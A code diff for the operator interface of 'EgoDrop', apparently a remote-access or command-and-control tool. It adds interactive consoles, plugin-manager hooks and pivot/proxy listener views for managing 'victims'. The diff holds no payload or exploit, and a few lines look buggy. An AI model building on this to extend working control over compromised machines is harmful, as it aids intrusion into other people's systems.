@@ -14,8 +14,8 @@ namespace EgoDrop
 
         private Dictionary<string, clsAgent> m_dicAgent = new Dictionary<string, clsAgent>();
 
-        private clsSqlite m_sqlite { get; set; } //Sqlite object.
-        private clsIniMgr m_iniMgr { get; set; } //IniMgr object.
+        private clsSqlite m_sqlite { get; init; } //Sqlite object.
+        private clsIniMgr m_iniMgr { get; init; } //IniMgr object.
 
         public frmMain()
         {
@@ -25,12 +25,19 @@ namespace EgoDrop
             m_iniMgr = new clsIniMgr("config.ini"); //IniMgr object.
         }
 
+        /// <summary>
+        /// Group type.
+        /// </summary>
         private enum enGroup
         {
             All,
             Orphan,
             Offline,
         }
+
+        /// <summary>
+        /// All groups.
+        /// </summary>
         private Dictionary<enGroup, TreeNode> m_dicGroupTreeNode = new Dictionary<enGroup, TreeNode>();
 
         #region Tools
@@ -61,7 +68,7 @@ namespace EgoDrop
         private string fnszGetVictimID(ListViewItem item) => item.SubItems[1].Text;
 
         /// <summary>
-        /// 
+        /// Get agent object from ListViewItem's tag.
         /// </summary>
         /// <param name="item"></param>
         /// <returns></returns>
@@ -82,7 +89,7 @@ namespace EgoDrop
         }
 
         /// <summary>
-        /// 
+        /// Get agent object with victim ID.
         /// </summary>
         /// <param name="szVictimID"></param>
         /// <returns></returns>
@@ -102,7 +109,11 @@ namespace EgoDrop
         /// <returns></returns>
         private bool fnbIsUnixLike(ListViewItem item) => !item.SubItems[7].Text.ToLower().Contains("windows");
 
-
+        /// <summary>
+        /// Find interactive console with agent object.
+        /// </summary>
+        /// <param name="agent">Agent object.</param>
+        /// <returns></returns>
         private TabPage fnFindInteractTab(clsAgent agent)
         {
             foreach (TabPage page in tabControl1.TabPages)
@@ -188,8 +199,8 @@ namespace EgoDrop
         {
             treeView3.Nodes.Clear();
 
-            TreeNode nodeListener = new TreeNode("Server");
-            TreeNode nodeProxy = new TreeNode("Proxy");
+            TreeNode nodeListener = new TreeNode("Server"); //Pivoting server listener.
+            TreeNode nodeProxy = new TreeNode("Proxy"); //Proxy server listener.
 
             treeView3.Nodes.AddRange(new TreeNode[]
             {
@@ -197,18 +208,20 @@ namespace EgoDrop
                 nodeProxy,
             });
 
+            //Add pivoting server into treeview.
             foreach (string szName in m_dicListener.Keys)
             {
                 var ltn = m_dicListener[szName];
                 nodeListener.Nodes.Add(new TreeNode(szName));
                 nodeListener.Nodes[nodeListener.Nodes.Count - 1].Nodes.AddRange(new TreeNode[]
                 {
-                    new TreeNode($"Port[{ltn.m_stListener.nPort}]"),
-                    new TreeNode($"Protocol[{Enum.GetName(ltn.m_stListener.protoListener)}]"),
+                    new TreeNode($"Port[{ltn.m_stListener.nPort}]"), //Port.
+                    new TreeNode($"Protocol[{Enum.GetName(ltn.m_stListener.protoListener)}]"), //
                     new TreeNode($"Listening[{(ltn.m_bIsListening ? "True" : "False")}]"),
                 });
             }
 
+            //Add proxy server into treeview.
             foreach (string szName in m_dicLtnProxy.Keys)
             {
                 var ltn = m_dicLtnProxy[szName];
@@ -225,7 +238,13 @@ namespace EgoDrop
             nodeProxy.Expand();
         }
 
-        TabPage fnCreateNewInteractPage(clsAgent agent, bool bAdd = true)
+        /// <summary>
+        /// Create new interactive console tabpage.
+        /// </summary>
+        /// <param name="agent"></param>
+        /// <param name="bAdd"></param>
+        /// <returns></returns>
+        TabPage fnCreateNewInteractPage(clsAgent agent)
         {
             TabPage page = new TabPage(agent.m_szUriName);
             RichTextBox rb = new RichTextBox()
@@ -233,24 +252,76 @@ namespace EgoDrop
                 BackColor = Color.Black,
                 ForeColor = Color.White,
             };
-            TextBox tb = new TextBox();
+            TextBox tb = new TextBox()
+            {
+                BackColor = Color.Black,
+                ForeColor = Color.White,
+            };
 
             page.Controls.Add(rb);
             page.Controls.Add(tb);
 
+            //Command handler.
+            tb.KeyDown += fnOnInteractConsoleKeyDown;
+
             rb.Dock = DockStyle.Fill;
-            rb.Dock = DockStyle.Bottom;
+            tb.Dock = DockStyle.Bottom;
 
             rb.BringToFront();
 
-            if (bAdd)
-                tabControl1.TabPages.Add(page);
+            tabControl1.TabPages.Add(page);
 
             return page;
         }
 
+        /// <summary>
+        /// Find interactive console page with agent object.
+        /// </summary>
+        /// <param name="agent">Agent object.</param>
+        /// <returns>Interact page, return null if not found.</returns>
+        TabPage fnFindInteractPage(clsAgent agent)
+        {
+            foreach (TabPage page in tabControl1.TabPages)
+            {
+                if (string.Equals(agent.m_szUriName, page.Text))
+                {
+                    return page;
+                }
+            }
+
+            return null;
+        }
+
         #endregion
         #region Events
+
+        private void fnOnInteractConsoleKeyDown(object sender, KeyEventArgs e)
+        {
+            if (sender == null)
+                return;
+
+            TextBox tb = (TextBox)sender;
+            if (tb == null)
+                return;
+
+            List<string> lsArgs = tb.Text.Split(' ').ToList();
+            fnOnInteractConsoleCommand(lsArgs);
+        }
+
+        /// <summary>
+        /// Interactive console command handler.
+        /// </summary>
+        /// <param name="lsArgs"></param>
+        private void fnOnInteractConsoleCommand(List<string> lsArgs)
+        {
+            if (lsArgs == null || lsArgs.Count == 0)
+                return;
+
+            if (lsArgs[0] == "sleep")
+            {
+
+            }
+        }
 
         /// <summary>
         /// New victim event handler.
@@ -456,9 +527,27 @@ namespace EgoDrop
                         }
                     }
                 }
+                else if (lsMsg[0] == "plugin")
+                {
+                    if (lsMsg[1] == "output")
+                    {
+                        if (lsMsg[2] == "info") //[*]
+                        {
+
+                        }
+                        else if (lsMsg[2] == "ok") //[+]
+                        {
+
+                        }
+                        else if (lsMsg[2] == "err") //[-]
+                        {
+
+                        }
+                    }
+                }
                 else if (lsMsg[0] == "disconnect")
                 {
-                    fnOnVictimDisconnected(ltn, victim, lsMsg[1]);
+                    fnOnVictimDisconnected(ltn, victim, szSrcVictimID);
                 }
             }));
         }
@@ -498,7 +587,7 @@ namespace EgoDrop
                     if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)) && string.Equals(item.SubItems[1].Text, szVictimID))
                     {
                         listView1.Items.Remove(item);
-                        
+
                         if (!m_dicAgent.ContainsKey(szVictimID))
                             m_dicAgent.Remove(szVictimID);
 
@@ -538,7 +627,7 @@ namespace EgoDrop
                         "Warning",
                         MessageBoxButtons.YesNo,
                         MessageBoxIcon.Warning,
-                        MessageBoxDefaultButton.Button2 //No
+                        MessageBoxDefaultButton.Button1 //No
                     );
 
                     if (dr == DialogResult.Yes)
@@ -577,16 +666,7 @@ namespace EgoDrop
         /// <param name="bRoot"></param>
         /// <param name="szIPv4"></param>
         /// <param name="enProtocol"></param>
-        public void fnOnAddChain(
-            clsListener listener,
-            clsVictim victim,
-            List<string> lsVictim,
-            string szOS,
-            string szUsername,
-            bool bRoot,
-            string szIPv4,
-            NetworkView.enConnectionType enProtocol
-        )
+        public void fnOnAddChain(clsListener listener, clsVictim victim, List<string> lsVictim, string szOS, string szUsername, bool bRoot, string szIPv4, NetworkView.enConnectionType enProtocol)
         {
             bool fnbIsUnixlike(string szOS)
             {
@@ -795,8 +875,6 @@ namespace EgoDrop
         {
             //Load groups
             m_dicGroupTreeNode.Add(enGroup.All, treeView1.Nodes[0]);
-            m_dicGroupTreeNode.Add(enGroup.Orphan, treeView1.Nodes[1]);
-            m_dicGroupTreeNode.Add(enGroup.Offline, treeView1.Nodes[2]);
 
             List<string> lsGroup = m_sqlite.fnlsGetGroups();
             foreach (string szName in lsGroup)
@@ -1263,6 +1341,46 @@ namespace EgoDrop
                 page = fnCreateNewInteractPage(node.Agent);
 
             tabControl1.SelectedTab = page;
+        }
+
+        private void toolStripMenuItem34_Click(object sender, EventArgs e)
+        {
+            NetworkNode node = networkView1.SelectedNode;
+            if (node == null)
+                return;
+
+            clsAgent agent = node.Agent;
+            if (agent == null)
+                return;
+
+            frmPluginMgr f = clsTools.fnFindForm<frmPluginMgr>(agent);
+            if (f == null)
+            {
+                f = new frmPluginMgr(this, agent);
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
+        }
+
+        private void tabControl1_DrawItem(object sender, DrawItemEventArgs e)
+        {
+            TabControl tab = (TabControl)sender;
+            if (sender == null)
+                return;
+
+            TabPage page = tab.TabPages[e.Index];
+
+            bool bIsSelected = e.Index == tab.SelectedIndex;
+
+
+        }
+
+        private void tabControl1_MouseDown(object sender, MouseEventArgs e)
+        {
+
         }
     }
 }
